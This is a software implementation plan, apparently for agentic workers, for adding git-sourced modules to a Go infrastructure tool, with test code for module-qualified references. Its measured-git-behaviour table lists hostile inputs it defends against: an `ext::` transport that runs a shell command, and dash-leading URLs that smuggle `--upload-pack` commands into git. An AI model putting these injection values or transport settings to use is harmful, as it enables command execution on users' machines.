# M5 — Modules Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development
> (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use
> checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make modules real — loaded from a path or a pinned git remote, instantiated like a
resource, expanded away before anything downstream learns they existed.

**Architecture:** Compiler stage 5 sits between variables (stage 4) and binding (stage 6).
`modules:` is a list of SOURCES that makes a module available under a name, carrying no inputs;
a resource of type `module.<name>` instantiates it, and its attributes are the module's inputs.
Stage 5 loads each module's `module.yml`, walks nested modules under a depth bound, and returns
an `Expansion` of flat instances each carrying the scope that resolves its names. Stage 6
qualifies references against that scope. After stage 5, `ResolvedConfig` is flat and unchanged,
so the planner, graph, state and executor never learn modules exist.

**Tech Stack:** Go 1.24, Cobra, `gopkg.in/yaml.v3` — the entire third-party budget, unchanged.
Remote sources shell out to the `git` binary; no new dependency.

**Spec:** `PLAN.md` §11 (rewritten 2026-09-11), with §5.2 addressing, §7 precedence, §7.4
diagnostics, §28 export, §44 error messages and §47's invariants. The authoring contract and its
21 amendments are `.superpowers/sdd/m5-authoring/contract.md` — read it when a task's reasoning
is unclear; it records why each decision went the way it did.

## Execution order

Task numbers are the authors' and are STABLE IDs, not positions. They do not collide, and
roughly fifty cross-references between tasks depend on them. Execute in the order below.

| Order | Task | Why here |
|-------|------|----------|
| 1 | **1** | `Reference` carries the address; the parse-time `module.` guard. No dependencies. |
| 2-5 | **11, 12, 13, 14** | `internal/modules/source`. Task 2 imports it and cannot compile without it. |
| 6-7 | **2, 3** | Stage 2 decoding. Imports `source` for `Parse` and `DeriveName`. |
| 8-11 | **4, 5, 6, 7** | Compiler stage 5. Consumes stage 2's decls and a `source.Resolver`. |
| 12-14 | **8, 9, 10** | Wiring, origins, integration. Consumes `Expansion`. |

## Global Constraints

Every task's requirements implicitly include this section.

- **Exactly two third-party dependencies**: `github.com/spf13/cobra` and `gopkg.in/yaml.v3`.
  Everything here is the standard library plus shelling out to `git`.
  `git diff --stat go.mod go.sum` must print nothing at the end of the milestone.
- **`internal/config` is the ONLY package permitted to touch `yaml.Node`.** `modules.lock` is
  therefore JSON, written with `encoding/json`. This must still print nothing:
  ```bash
  grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"
  ```
- **Exactly one redaction path**, `pkg/value.Format`. Never acquire a second. This is why a
  source URL carrying credentials is REFUSED rather than redacted, and why stage 5 must never
  fold module inputs by re-serializing through `value.Expr.String()` — that function returns
  `value.Redacted`, so a sensitive input would be applied as the literal string `<sensitive>`.
  ```bash
  # The only NON-COMMENT hit must be pkg/value/format.go. Two comments in
  # pkg/report and internal/cli legitimately mention the string; they are not
  # redaction paths, and a check that flags them cries wolf.
  grep -rn '"<sensitive>"' --include=*.go . | grep -v _test.go | grep -v ':[0-9]*:[[:space:]]*//'
  ```
- **`internal/graph` imports no other infra package; `providers/*` import no `internal/*`.**
  No task here touches either, and none may start to.
- **`mise` is inactive in non-interactive shells.** Every command needs
  `export PATH="$HOME/.local/share/mise/shims:$PATH"` first, or a bare `go` resolves to 1.20
  and fails.
- **`-count=1` on every test run, always.** `tests/integration` shells out to `go build` rather
  than importing packages, so Go's cache once reported `ok (cached)` while production code was
  sabotaged.
- **Commit discipline, non-negotiable**: `git add <explicit paths>` then
  `git commit -m "..." -- <same paths>`. `git add -A`, `git add .`, and any unscoped commit are
  forbidden.
- **Diagnostics collect rather than fail fast** (§7.4), and each says what is wrong, where, what
  was expected, and an action that works **today** — never one naming a command a later
  milestone will add.
- **Invariant 6, plan determinism**: anything a user can observe is sorted once, deliberately,
  and never left to Go's randomised map order. `modules.lock`'s entries are sorted by
  `(source, ref)` where they are produced, because the file is compared against on every later
  run and reordering would report a change that did not happen.
- **Remove a guard and add the capability it guards in the same change, per command.** M4 paid
  for this: one task removed `--var-file` from the unsupported-flag list for every command while
  wiring only `plan`, and for four tasks `apply --var-file` accepted the file and applied the
  default instead. Neither task's tests could see the window, because each covered its own
  command.
- **Assert the thing did not happen, not that we said it would not happen.** Every refusal needs
  a test that the refused thing did not occur — the resource is not decoded, the shell command
  did not execute, the file is byte-identical afterwards. A test asserting only the message
  passes against an implementation that prints it and proceeds anyway. Both of M3's safety
  switches shipped doing nothing with passing tests.
- **For any requested check, write the cheapest implementation that satisfies it; if that
  implementation is wrong, the difference is the missing test.**

---

## The consumer contract

Stated once, here, because these tasks cannot enforce it from inside. The implementer of
Tasks 11-14 does not write any of it; the lead hands it to Authors A and B.

**Stage 2 (`internal/config`, Author A's Task 2) owes this package:**

- call `source.Parse(raw, origin)` for every `modules:` entry and **surface its
  diagnostics** — they are the error a user sees from `infra validate`;
- store the resulting `source.Source` in `ModuleLoadDecl`, not the raw string;
- call `source.DeriveName(src)` for a scalar entry, and surface ITS diagnostic when a name
  cannot be derived;
- never re-implement either split. There is exactly one answer to "where does the ref end
  and the location begin", and it lives in this package.

**Stage 5 (`internal/modules`, Author B's Tasks 4-7) owes this package:**

- build one `*source.Cache` per run with `source.NewCache(projectDir)` and pass it down
  every level, so one lockfile is read once and one set of resolutions is written once;
- call `cache.Resolve(decl.Source, baseDir)` where it currently joins a path, and **not**
  call `Parse` again — the parsed value is already there, and re-parsing would re-emit
  every diagnostic stage 2 already printed;
- for each resolution, build `source.Pin(src, res)` and pass it to
  `lockfile.Check(rec, src.Origin)` — one `LoadLockfile` per run — collecting the
  diagnostics. `Check` writes nothing, which is what lets `validate` report a moved tag;
- **carry the records on `Expansion`.** Stage 5 is the only component that sees every
  resolution, including the nested ones a module's own `module.yml` declares, so it is the
  only place that can hand over a complete set;
- **not write the lockfile itself.** The COMMAND writes it: a mutating command
  (`plan`, `apply`) calls `source.WriteLockfile(dir, expansion.Pins)` once, after a
  successful walk. `infra validate` never calls it, and needs no flag to be told not to —
  it simply does not, which is why `internal/cli/validate.go` stays a command that writes
  only its `--output` report;
- **delete its "remote sources are not built yet" guard in the same commit that adds the
  `Resolve` call.** This is the M4 lesson in `CLAUDE.md`: a guard removed in one change
  and the capability added in another leaves a window where the input is accepted and
  silently mishandled — there, `apply --var-file` applying the default instead, for four
  tasks. Here the window would accept a remote source and resolve it as a relative path.

**Whoever lands that wiring owes the integration coverage** this package cannot write:
three tests, specified as code in the appendix at the end of this file, including the one
that asserts an `ext::` source did not EXECUTE. A refusal test that only checks the
message would pass against an implementation that ran the command and complained
afterwards.

---


---

## What git actually does, measured

Everything in this section was run against `git version 2.43.0` before the tasks below
were written. Each line is a behaviour a task depends on; if your git differs, the task
that depends on it says what to do.

| # | Behaviour | Measured |
|---|-----------|----------|
| 1 | A transport policy blocks a local-path clone | `fatal: transport 'file' not allowed` |
| 2 | Naming one transport re-permits exactly that one | clone succeeds |
| 3 | **`url.<x>.insteadOf` rewriting happens BEFORE the protocol check** | an `https://` URL rewritten to a local path clones when `file` is allowed, and is refused with `transport 'file' not allowed` when it is not |
| 4 | **`GIT_ALLOW_PROTOCOL` in the environment OVERRIDES `-c protocol.*.allow`, in both directions** | `GIT_ALLOW_PROTOCOL=file` clones despite `-c protocol.file.allow=never`; `GIT_ALLOW_PROTOCOL=https` refuses despite `-c protocol.file.allow=always` |
| 5 | **`protocol.ext.allow=always` in a user's own config re-enables `ext::`, and the shell command RUNS** | the helper's `sh` executed and its output appeared |
| 6 | Our policy stops it, and `-c` would not have | with `GIT_ALLOW_PROTOCOL=https`, `ext::` is refused even with `protocol.ext.allow=always` in the user's config |
| 7 | An inherited `GIT_ASKPASS` that blocks makes `git` block | a 30-second askpass script hung `ls-remote` past a 6-second timeout |
| 8 | `GIT_ASKPASS=/bin/false` + `GIT_TERMINAL_PROMPT=0` fails in 20ms | `fatal: could not read Username for '...': terminal prompts disabled` |
| 9 | **With no controlling terminal, git fails fast even with NO guard** | `fatal: could not read Username ...: No such device or address` — see 12.9 for why this makes one half of Amendment 10d untestable end to end |
| 10 | **`git ls-remote <url> refs/tags/X` returns the TAG OBJECT hash for an annotated tag** | `f2535030…  refs/tags/v2.0.0` while the commit is `34d6815f…` |
| 11 | The peeled commit requires asking for it | `refs/tags/v2.0.0^{}` → `34d6815f…`; passing only the unpeeled pattern never prints it |
| 12 | **`ls-remote` for a ref that does not exist exits 0 with empty output** | exit 0, no lines |
| 13 | `git fetch --depth=1 -- <url> "+<ref>:refs/infra/target"` works with no `remote add` | fetch succeeds against a bare repo by path |
| 14 | **An abbreviated hash cannot be fetched** | `fatal: couldn't find remote ref 34d6815` |
| 15 | A full fetch then `git rev-parse <prefix>^{commit}` resolves it locally | `34d6815f…` |
| 16 | Without `--`, git parses a dash-leading URL as an option | `git clone "--upload-pack=echo" c9b` consumed the URL as a flag and treated `c9b` as the repository |
| 17 | With `--`, the same string is treated as a repository name | `fatal: repository '-upload-pack=touch /tmp/x' does not exist` |
| 18 | `-c init.templateDir=` and `-c core.hooksPath=<nonexistent>` are both accepted | `init` and `checkout` succeeded |

Lines 3, 4, 5 and 10 are the four that change the design. Line 9 is the one that changes
what a test can honestly claim.

---


---

## What is NOT here, and the coverage boundary I could not close

**An end-to-end fetch over an allowed transport is not testable in this repository.** The
allowlist is `https://`, `ssh://` and the `git@host:path` shorthand. A test may not use
the network, and none of those three can be served from a temp directory: `https://` on
loopback needs a certificate git will trust, `ssh://` needs an sshd. A local bare repo IS
a legitimate git remote and needs no network, but it is reached as a **path**, and a path
is `KindPath` — `Parse` will never classify it as `KindGit`. That seam is real and these
tasks resolve it in three parts rather than pretending it away:

1. **Tasks 12 and 13 construct `Source{Kind: KindGit, Location: <local bare repo>}`
   directly in their tests**, bypassing `Parse` and nothing else. Every line under test —
   the environment, the protocol policy, the fetch, the tag peeling, the lock, the
   publication, the skip rules — is the production line. This is the one class of test
   this project catalogues (a value constructed in a test that production never builds),
   so it is paired with (2) and it is named as such in each test's comment.
2. **Task 11 pins the seam from the other side**: `Parse` returns `KindPath` for a bare
   path and refuses `file://` by name, with tests. So the combination "a `KindGit` whose
   location is a path" is unreachable from configuration, and the tests in (1) are
   exercising production code through an input production cannot supply — not an input
   production would reject.
3. **`KindGit` is reachable end to end through the CLI anyway**, by the one route that
   needs no server: a hash-pinned source whose cache entry is already present and valid
   skips the network entirely (13.6). The appendix specifies that test — pre-populate the
   cache, point the source at `https://example.invalid/repo:<40-hex>`, assert `plan`
   succeeds — for whoever lands the wiring. It fails loudly if the skip rule is removed,
   because then it would try to reach `example.invalid`. It is not in these four tasks
   because no CLI can plan a module when they run.

What remains uncovered end to end, stated rather than hidden: **a moved tag reported by
`infra validate`** (contract DoD 36c). Detecting a moved tag requires `ls-remote` against
a live remote on every run, by construction (13.6), so the pre-populated-cache route
cannot reach it. It is covered at package level in 14.2 and recorded as package-level in
the DoD table with this reason.

---

---

## Task 1 — `Reference` names a resource by ADDRESS, not by bare name

### Why this task exists

M3 filed this against M5 in a comment that is still in the tree
(`internal/expressions/resources.go`, `ResourceScope.Attribute`):

```go
	attrs, ok := s[(address.Address{Name: ref.Resource}).String()]
```

`value.Reference` keys on a bare name, so `${db.id}` written inside a module and `${db.id}`
written at the root parse to the identical `Reference`. The moment stage 5 re-roots a
module's resources to `module.net.db`, that lookup misses the module's `db` — and when two
modules each declare a `db`, or a module declares one the root also has, it matches a
**different resource's** attributes and hands them back as the answer. Nothing errors. The
plan is silently wrong, and the executor then applies it.

The same bare key breaks dependency edges before it breaks values:
`Expr.References()` deduplicates on `Ref.String()`, so one expression referencing
`module.net.db.id` and `module.app.db.id` collapses to a single edge — an entire missing
edge in the dependency graph, which is acceptance invariant 4.

This task closes both, before any code exists that can produce a non-empty module path.

### The shape, and why

**RULED (contract Ruling 1, option b): `Reference{Target address.Address; Attribute string}`.**

The contract left the choice to this task and asked it to state why. It is (b) for four
reasons, in descending weight:

1. **One spelling of "which resource".** Option (a) — `Reference{Module []string; Resource,
   Attribute string}` — would need its own `String()` that must agree with
   `Address.String()` forever, and its own re-rooting function that must agree with
   `Address.InModule`. That is the duplication Ruling 1 exists to refuse.
2. **The re-rooting is already written and already correct.** `Address.InModule` copies the
   module slice before prepending, so stage 5 cannot alias one instantiation's path into
   another's. Option (a) would reimplement that aliasing hazard from scratch.
3. **It deletes the defective line rather than editing it.**
   `s[(address.Address{Name: ref.Resource}).String()]` becomes `s[ref.Target.String()]` —
   the construction whose comment names this bug disappears.
4. **The edge is acyclic and free.** Verified at HEAD: `go list -deps ./pkg/address | grep
   infrata` prints only `pkg/address` itself, so `pkg/value` importing `pkg/address`
   introduces no cycle and no third-party dependency.

**The root case stays a one-liner.** `value.LocalRef("db", "id")` replaces
`value.Reference{Resource: "db", Attribute: "id"}` at every existing construction site — the
same length, no ceremony. It is named `LocalRef`, not `RootRef`, because that is what the
parser actually produces: a reference **relative to the scope it was written in**, whose
module path is empty until something makes it absolute. At the root, local and absolute are
the same thing, which is why every construction site in the tree today is correct unchanged.

### THIS TASK IS HALF THE FIX. Read this before starting.

Adding the field closes nothing on its own. `expressions.Parse` is called exactly once in
the tree — `internal/compiler/bind.go:140`, stage 6 — so a reference comes into existence
already parsed, scope-relative, with an EMPTY module path. Something has to fill it.

**Contract Amendment 7 rules where: stage 6, via `Qualify`.** `bindAttribute` becomes
parse → qualify → evaluate, and stage 5's job is to record, per instantiated resource, the
scope that makes qualification possible — not to rewrite references it cannot see:

```go
e, _ := expressions.Parse(src, attr.Origin)   // scope-relative, empty module path
e = inst.Scope.Qualify(e)                     // absolute, using the instance's path
v := expressions.Evaluate(e, inst.Scope)
```

**`Qualify` is Task 8's, not this one's.** What matters here is that without it, Ruling 1's
landmine comes back one stage later wearing a disguise: `Reference` would carry a module
path nothing ever fills, every reference would stay scope-relative, two modules each
declaring a `db` would still resolve to the same resource — and there would now be a field
making it look handled. **A field that is always empty is worse than no field, because it
stops the next person looking.**

### AND IT SHIPS ONE GUARD, because the field creates a leak on the way in

`Qualify` PRODUCES module-qualified targets. The parser must never ACCEPT one, and step 1.4a
is where that is enforced (contract Amendment 14a).

The mechanism, verified at HEAD. `parseReference` (`internal/expressions/parse.go:234`) joins
every segment but the last into the target name, so `${module.prod.database.id}` yields the
target name `module.prod.database`. `Address.String()` returns `Name` verbatim when `Module`
is empty (`pkg/address/address.go:26`), so:

```go
address.Address{Name: "module.prod.database"}.String()            // "module.prod.database"
address.Address{Module: []string{"prod"}, Name: "database"}.String() // "module.prod.database"
```

**Byte for byte identical.** Stage 6 keys its target map by canonical address, so a
user-written `${module.prod.database.id}` resolves against the real `database` inside
instance `prod`, and a module's internals become addressable from outside it. A module
exposes outputs, not resources (`PLAN.md` §11.2).

The guard goes at PARSE time rather than at the lookup, deliberately. In `bindReferences` you
would have to tell "qualified by `Qualify`" from "typed by the user", and by then they are the
same bytes — there is nothing left to distinguish. At parse time they are trivially
different, because `Qualify` has not run and never routes through `parseReference`: it sets
`Target.Module` structurally on an already-parsed expression. This is the
unrepresentable-mistake shape rather than a check that has to be right.

So this task ships the field, the guard, AND the test that fails if the field is never
filled. Step 1.3 adds three tests to `internal/expressions/resources_test.go`; the third of
them,
`TestAttributeRefusesAnUnqualifiedReference`, is the one that pins the unfilled state as an
observable failure. Its real job is to stop the tempting wrong fix: when a reference reaches
`ResourceScope.Attribute` still scope-relative, the snapshot lookup misses, and the fastest
way to make that "work" is a bare-name fallback in `Attribute` — which silently restores the
exact cross-module mismatch Ruling 1 exists to prevent. That test makes the fallback fail
rather than pass.

An earlier draft of this task said stage 5 re-roots references and that stage 6 must parse
INTO scope rather than parse-then-qualify. Both were wrong: stage 5 has no references to
re-root, and `Qualify(e)` returns the qualified expression that is then stored, so the
`References()`-returns-copies objection that motivated parse-into-scope does not apply.

### Files

| Action | Path |
|--------|------|
| create | `pkg/value/reference_test.go` |
| modify | `pkg/value/expr.go` — the type, `String`, `LocalRef`, `VarRef`, `InModule`, `VarName`; import `pkg/address` |
| modify | `pkg/value/expr_test.go` — 9 construction sites, 1 field read |
| modify | `internal/expressions/parse.go` — 2 construction sites, and the `module`-segment guard |
| modify | `internal/expressions/parse_test.go` — 3 field reads, and 4 new tests for the guard |
| modify | `internal/expressions/eval.go` — 3 field reads |
| modify | `internal/expressions/resources.go` — the defective lookup, its comment, and the now-unused `pkg/address` import |
| modify | `internal/expressions/resources_test.go` — 4 construction sites, plus three new tests (module shadowing, absent module, unqualified reference) |
| modify | `internal/compiler/bind.go` — 5 field reads |
| modify | `internal/compiler/resolved_test.go` — 2 construction sites |
| modify | `internal/executor/resolve_test.go` — 1 construction site |

**Measured at HEAD, so you are not surprised by the compile errors.** 18 construction sites
(`Reference{...}` literals: 9 in `pkg/value/expr_test.go`, 2 in `internal/expressions/parse.go`,
4 in `internal/expressions/resources_test.go`, 2 in `internal/compiler/resolved_test.go`,
1 in `internal/executor/resolve_test.go`) and **13** reads of the `.Resource` field, of which
**9 are production code** (3 in `internal/expressions/eval.go`, 5 in `internal/compiler/bind.go`,
1 in `internal/expressions/resources.go`) and 4 are tests (1 in `pkg/value/expr_test.go`,
3 in `internal/expressions/parse_test.go`). The contract's figure of "7 field reads"
undercounts; work from this list.

`Reference` is **not serialized anywhere** — `grep -rn "Reference\|Expr" pkg/value/json.go`
is empty and no state or plan file carries an `Expr` — so this changes no on-disk format and
needs no version bump. `internal/compiler/resolved.go` hashes `e.Ref.String()` into
`ConfigHash`; for a root reference the rendered string is byte-identical before and after,
so no existing configuration's hash moves.

### Interfaces

**Consumes (from HEAD):**

```go
// pkg/address
type Address struct {
    Module []string `json:"module,omitempty"` // empty at the root
    Name   string   `json:"name"`
}
func (a Address) String() string
func (a Address) InModule(name string) Address // prepends, copying the slice

// pkg/value
type Reference struct { Resource, Attribute string }   // REPLACED by this task
type Expr struct { Op ExprOp; Literal Value; Ref Reference; Args []*Expr; Function string; Origin Origin }
func (e *Expr) References() []Reference

// internal/expressions
type Scope interface {
    Variable(name string) (value.Value, bool)
    Attribute(ref value.Reference) (value.Value, bool)
}
type ResourceScope map[string]map[string]value.Value
```

**Produces (every later task in M5 depends on these exactly):**

```go
// pkg/value
type Reference struct {
    Target    address.Address
    Attribute string
}
func LocalRef(resource, attribute string) Reference      // module path empty: as written
func VarRef(name string) Reference                       // what OpVarRef carries
func (r Reference) InModule(module string) Reference     // the primitive modules.Scope.Qualify uses (Task 8)
func (r Reference) VarName() string                      // OpVarRef's variable name
func (r Reference) String() string                       // "module.net.db.id"
```

`Scope.Attribute`'s signature is unchanged — it still takes a `value.Reference` — so stage 5
does not need a new scope interface. What changes is that `ResourceScope` is now keyed by the
**canonical address string** rather than by a bare name, which is what makes a module's `db`
and the root's `db` two different keys.

`internal/compiler/bind.go`'s `declared` map stays keyed by `decl.Name` in this task and is
looked up with `ref.Target.String()`. Today those are equal for every configuration the
engine can produce (`Address.String()` returns `Name` when `Module` is empty). **The later
stage-5 task changes `declared[r.Name] = true` to `declared[addr.String()] = true` and
touches nothing else in that file** — that is why the lookup is written against the canonical
string now rather than against `.Target.Name`.

### Steps

#### 1.1 — Write the failing tests for the new shape

Create `pkg/value/reference_test.go`:

```go
package value

import (
	"testing"

	"github.com/infrata/infrata/pkg/address"
)

// TestReferenceStringIncludesTheModulePath pins the whole point of Ruling 1:
// a reference renders as the address it names, module path and all.
//
// It discriminates against the shape this task replaces and against any
// implementation that carries a module path but drops it when rendering —
// which would be worse than not carrying one, because References() and
// ConfigHash both read a reference through String().
func TestReferenceStringIncludesTheModulePath(t *testing.T) {
	r := Reference{Target: address.Address{Module: []string{"net"}, Name: "db"}, Attribute: "endpoint"}
	if got := r.String(); got != "module.net.db.endpoint" {
		t.Errorf("String() = %q, want \"module.net.db.endpoint\"", got)
	}
	nested := Reference{Target: address.Address{Module: []string{"net", "inner"}, Name: "db"}, Attribute: "endpoint"}
	if got := nested.String(); got != "module.net.module.inner.db.endpoint" {
		t.Errorf("nested String() = %q", got)
	}
}

// TestReferencesDoesNotCollapseSameNamedResourcesInDifferentModules is the
// dependency-graph half of the bug, and it is the test that would have caught
// the bare-name shape.
//
// References() deduplicates on Ref.String(). Two modules each declaring a `db`
// produce two references that are identical as bare names, so a bare-name
// Reference yields ONE edge where two are required — a missing dependency
// edge, which is acceptance invariant 4, from an expression that looks
// entirely ordinary.
func TestReferencesDoesNotCollapseSameNamedResourcesInDifferentModules(t *testing.T) {
	e := &Expr{Op: OpConcat, Args: []*Expr{
		{Op: OpResourceRef, Ref: Reference{Target: address.Address{Module: []string{"net"}, Name: "db"}, Attribute: "id"}},
		{Op: OpResourceRef, Ref: Reference{Target: address.Address{Module: []string{"app"}, Name: "db"}, Attribute: "id"}},
	}}
	got := e.References()
	if len(got) != 2 {
		t.Fatalf("References() returned %d references, want 2: two modules each declaring a \"db\" "+
			"must produce two dependency edges, not one; got %v", len(got), got)
	}
	if got[0].String() == got[1].String() {
		t.Errorf("both references render as %q", got[0].String())
	}
}

// TestLocalRefIsScopeRelative pins the constructor every existing call site
// uses: a reference as WRITTEN, with no module path, which at the root is also
// the absolute one.
func TestLocalRefIsScopeRelative(t *testing.T) {
	r := LocalRef("db", "id")
	if len(r.Target.Module) != 0 {
		t.Errorf("LocalRef gave a module path %v; a reference as written has none until it is resolved into a scope", r.Target.Module)
	}
	if got := r.String(); got != "db.id" {
		t.Errorf("String() = %q, want \"db.id\"", got)
	}
}

// TestInModuleReRootsWithoutAliasing pins that Reference.InModule DELEGATES to
// Address.InModule rather than appending to the receiver's slice.
//
// An implementation that did `r.Target.Module = append(r.Target.Module, ...)`
// would pass the rendering assertion and corrupt the caller's reference, which
// during expansion means one instantiation's references leaking into another's.
func TestInModuleReRootsWithoutAliasing(t *testing.T) {
	base := LocalRef("db", "id")
	inner := base.InModule("net")
	if got := inner.String(); got != "module.net.db.id" {
		t.Errorf("InModule gave %q, want \"module.net.db.id\"", got)
	}
	if len(base.Target.Module) != 0 {
		t.Error("InModule mutated the receiver's module path")
	}
	outer := inner.InModule("app")
	if got := outer.String(); got != "module.app.module.net.db.id" {
		t.Errorf("nested InModule gave %q", got)
	}
	if got := inner.String(); got != "module.net.db.id" {
		t.Errorf("the second InModule mutated the first result: %q", got)
	}
}

// TestVarRefCarriesABareName pins the OpVarRef case. A variable has no module
// path of its own — it is resolved in the scope the expression was written in,
// before stage 5 re-roots anything — so VarRef sets only the name, and String()
// must not render a trailing dot for the empty Attribute.
func TestVarRefCarriesABareName(t *testing.T) {
	r := VarRef("region")
	if got := r.VarName(); got != "region" {
		t.Errorf("VarName() = %q", got)
	}
	if got := r.String(); got != "region" {
		t.Errorf("String() = %q, want \"region\" with no trailing dot", got)
	}
}
```

Run it and see it fail:

```bash
go test ./pkg/value/ -count=1 -run TestReference
```

**Expected failure:** a compile error,
`unknown field Target in struct literal of type value.Reference` (and
`undefined: LocalRef`, `undefined: VarRef`). The package does not build, which is the
failure this step is looking for — the type does not carry a module path yet.

#### 1.2 — Change the type, and fix `pkg/value` only

In `pkg/value/expr.go`, add `"github.com/infrata/infrata/pkg/address"` to the import block
and replace the `Reference` type and its `String` method:

```go
// Reference names another resource's attribute — or, under OpVarRef, a
// variable by name.
//
// Target is an address.Address rather than a bare name because a reference and
// an address name the same thing and must agree about what that thing is. With
// a bare name, ${db.id} written inside a module and ${db.id} written at the
// root are indistinguishable, so once stage 5 re-roots a module's resources to
// module.net.db a lookup keyed on "db" misses the module's — or, when two
// modules each declare a `db`, matches the WRONG one and returns its
// attributes as the answer. That is a silently wrong plan, not an error.
//
// A reference parsed out of configuration is SCOPE-RELATIVE: its module path is
// empty, meaning "in whichever scope this expression was written". At the root
// that is already absolute, which is why LocalRef is the constructor for both.
//
// Stage 6 fills the path, via the scope stage 5 recorded for each instantiated
// resource: bindAttribute parses, qualifies, then evaluates. Carrying the field
// is only half of it — a module path that nothing ever fills leaves every
// reference scope-relative and two modules' same-named resources resolving to
// one, with a field present that makes it look handled.
//
// Under OpVarRef only Target.Name is meaningful. A variable has no module path:
// it is resolved in the scope the expression was written in, by stage 4, before
// any of this.
type Reference struct {
	Target    address.Address
	Attribute string
}

// LocalRef builds a reference as written, with no module path — which is what
// the parser produces and what a root-scoped reference is.
func LocalRef(resource, attribute string) Reference {
	return Reference{Target: address.Address{Name: resource}, Attribute: attribute}
}

// VarRef builds the reference an OpVarRef node carries.
func VarRef(name string) Reference {
	return Reference{Target: address.Address{Name: name}}
}

// VarName returns the variable named by a reference under OpVarRef.
func (r Reference) VarName() string { return r.Target.Name }

// InModule returns the reference as seen from inside a parent module
// instantiation: the primitive modules.Scope.Qualify applies, outermost last,
// to turn a scope-relative reference into an absolute one at stage 6.
//
// If Task 8's Qualify sets Target.Module from the scope's path directly rather
// than chaining this, DELETE this method in that task. An unused constructor on
// a type whose whole point is that its module path gets filled is the same
// misleading-by-presence problem the field itself would be.
//
// It delegates to address.InModule rather than appending to Target.Module,
// because that function copies the slice first: appending in place would let
// one instantiation's re-rooting alias into another's.
func (r Reference) InModule(module string) Reference {
	return Reference{Target: r.Target.InModule(module), Attribute: r.Attribute}
}

// String renders a reference in the form used in configuration.
func (r Reference) String() string {
	if r.Attribute == "" {
		return r.Target.String()
	}
	return r.Target.String() + "." + r.Attribute
}
```

Then fix `pkg/value/expr_test.go`'s 9 construction sites and 1 field read:

```bash
sed -i \
  -e 's/Reference{Resource: \("[^"]*"\), Attribute: \("[^"]*"\)}/LocalRef(\1, \2)/g' \
  -e 's/Reference{Resource: res, Attribute: attr}/LocalRef(res, attr)/g' \
  -e 's/v\.Expr\.Ref\.Resource != "db"/v.Expr.Ref.Target.Name != "db"/' \
  pkg/value/expr_test.go
git diff pkg/value/expr_test.go   # read every hunk before continuing
grep -n "Reference{Resource" pkg/value/expr_test.go   # must print nothing
```

Run:

```bash
go test ./pkg/value/ -count=1
```

**Expected: green.** The five new tests pass and every pre-existing `pkg/value` test still
passes. The rest of the repository does not build yet — that is step 1.4.

#### 1.3 — Write the failing cross-package test for the real bug

This is the test that fails against the defective lookup rather than against a missing field,
and it is the one that pins the invariant.

Append to `internal/expressions/resources_test.go`:

```go
// TestAttributeResolvesWithinItsModuleAndNotAgainstASameNamedRootResource is
// the M5 landmine M3 filed against this file, made executable.
//
// The snapshot holds TWO resources both logically named "db": one at the root
// and one inside module "net", with DIFFERENT endpoints. A reference carrying
// the module path must resolve to the module's.
//
// Against the bare-name lookup this replaces —
// s[(address.Address{Name: ref.Resource}).String()] — the module reference
// resolves to the ROOT db and hands back "root.example.com". Nothing errors:
// the plan is written with another resource's endpoint in it, and apply
// carries it out. This is why the fixture gives the two DIFFERENT values; two
// identical ones would pass against the broken lookup.
func TestAttributeResolvesWithinItsModuleAndNotAgainstASameNamedRootResource(t *testing.T) {
	scope := ResourceScope{
		"db": {
			"endpoint": value.String("root.example.com", value.SourceProvider),
		},
		"module.net.db": {
			"endpoint": value.String("net.example.com", value.SourceProvider),
		},
	}

	inModule := value.LocalRef("db", "endpoint").InModule("net")
	got, ok := scope.Attribute(inModule)
	if !ok {
		t.Fatalf("%s did not resolve; a reference inside a module must find that module's resource", inModule)
	}
	if s, _ := got.AsString(); s != "net.example.com" {
		t.Errorf("%s resolved to %q, want \"net.example.com\": the lookup is keyed on the bare name, "+
			"so it matched the root resource of the same name", inModule, s)
	}

	atRoot, ok := scope.Attribute(value.LocalRef("db", "endpoint"))
	if !ok {
		t.Fatal("the root db did not resolve")
	}
	if s, _ := atRoot.AsString(); s != "root.example.com" {
		t.Errorf("root db resolved to %q, want \"root.example.com\"", s)
	}
}

// TestAttributeDoesNotResolveAModuleReferenceAgainstAnAbsentModule is the
// other answer, and it stops the test above from passing against a lookup that
// simply ignores the module path in the other direction.
func TestAttributeDoesNotResolveAModuleReferenceAgainstAnAbsentModule(t *testing.T) {
	scope := ResourceScope{
		"db": {"endpoint": value.String("root.example.com", value.SourceProvider)},
	}
	ref := value.LocalRef("db", "endpoint").InModule("net")
	if v, ok := scope.Attribute(ref); ok {
		s, _ := v.AsString()
		t.Errorf("%s resolved to %q against a snapshot with no module \"net\"; a reference inside a "+
			"module must not fall back to a root resource of the same name", ref, s)
	}
}

// TestAttributeRefusesAnUnqualifiedReference is the test that fails if stage 6
// never qualifies (contract Amendment 7).
//
// Carrying a module path on Reference is only half the fix. If bindAttribute
// parses and evaluates without calling Qualify, every reference stays
// scope-relative with an empty module path, and one reaches this lookup looking
// exactly like the reference below. The snapshot holds ONLY the module's db, so
// the lookup misses — which is correct, and is what makes the failure visible.
//
// The real target is the tempting wrong fix. Faced with "my module's reference
// does not resolve", the fastest repair is a bare-name fallback in Attribute:
// try the canonical key, then try matching on Name alone. That makes the symptom
// go away and silently restores Ruling 1's landmine in full — two modules each
// declaring a `db` would match each other's. This test fails against that
// fallback, so the missing Qualify has to be fixed where it actually is.
func TestAttributeRefusesAnUnqualifiedReference(t *testing.T) {
	scope := ResourceScope{
		"module.net.db": {"endpoint": value.String("net.example.com", value.SourceProvider)},
	}

	// As parsed, before qualification: no module path.
	unqualified := value.LocalRef("db", "endpoint")
	if len(unqualified.Target.Module) != 0 {
		t.Fatalf("LocalRef is not scope-relative: %v", unqualified.Target.Module)
	}
	if v, ok := scope.Attribute(unqualified); ok {
		s, _ := v.AsString()
		t.Errorf("an unqualified %s resolved to %q against a snapshot holding only module.net.db. "+
			"Either stage 6's Qualify was skipped and this lookup is covering for it, or Attribute has "+
			"grown a bare-name fallback — which is Ruling 1's cross-module mismatch restored.", unqualified, s)
	}

	// The same reference, qualified as stage 6 will qualify it, DOES resolve.
	// Without this half the test above is satisfied by a lookup that resolves
	// nothing at all.
	qualified := unqualified.InModule("net")
	v, ok := scope.Attribute(qualified)
	if !ok {
		t.Fatalf("%s did not resolve; qualification is what makes a module's reference findable", qualified)
	}
	if s, _ := v.AsString(); s != "net.example.com" {
